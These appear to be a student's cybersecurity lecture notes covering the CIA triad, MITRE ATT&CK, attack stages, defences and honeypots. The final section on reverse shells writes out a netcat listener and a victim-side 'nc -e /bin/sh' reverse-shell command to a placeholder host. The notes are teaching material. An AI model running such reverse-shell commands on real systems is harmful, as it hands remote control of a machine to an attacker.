
---
**CIA Triad** - Confidentiality - Integrity - Availability
**Adversaries** try to violate one of the - CIA

##### [MITRE ATT&CK](https://attack.mitre.org/)
1. Reference framework built upon observations of many real attacks
2. Database (or ontology) (with links and navigation) for associating tactics/techniques
3. Tool - MITRE ATT&CK Navigator (Framework & Tool are not always perfectly aligned)
   - The ATT&CK Navigator is a web-based tool for annotating and exploring ATT&CK matrices.
   - It can be used to visualize defensive coverage, red/blue team planning, the frequency of detected techniques, and more.

##### Targets
1. Organizations
2. Single individuals
3. Industrial control systems (ICS)

---
##### Attacking an organization
1. Initial Access Execution
2. Persistence
3. C&C (Command & Control)
4. Discovery
5. Lateral movement
6. Privilege escalation (No damage yet)
7. Exfiltration / Impact (damage done)

**Exfiltration** - Violation of Confidentiality. Tool - `HTran`
**Impact** - Violation of Integrity or Availability

**Resource Development** - Adversary has to establish resources before Initial Access
**Reconnaissance** (or Recon) - Gather information for future operations (before Initial Access)

A strong defense on a **few techniques** may suffice to **disrupt the attack** (KILL CHAIN)

Defense must consist of:
1. Mitigation
2. Detection
3. Remediation - Backups

**Honey-pots**
1. Machines placed in networks to attract adversaries & detect their presence.
2. Company that provides useful & ready to use honey-pots: [Canarytokens](https://canarytokens.org/nest/)
3. This tool can only be helpful if Detection activities are already in place.
---
##### ICS
Attacks on **ICS** may have *strategic/intelligence* motivations.
Objective is stealing/disruption, not money.

---
##### Threat model
1. Starting point (Discussed in detail in [[Session - 4]])

---
##### Reverse Shells
1. Either remote shell - Malware is itself a shell. Example: `meterpreter`
2. Or malware spawns a shell of the target platform & connects I/O as needed.
3. But the remote shell has to be a client. If it becomes a server, we will not be able to access it from outside the organization.
4. Adversary
   - Listener. Example: `netcat` --> `nc -lnvp 4242`
   - Server at TCP level
   - Client at shell level
5. Malware (on Victim machine)
   - Server at shell level
   - Client at TCP level
   - Example: `nc -e /bin/sh IP-x 4242`
   - Or spawn a shell using `socket` & `subprocess` in Python

---
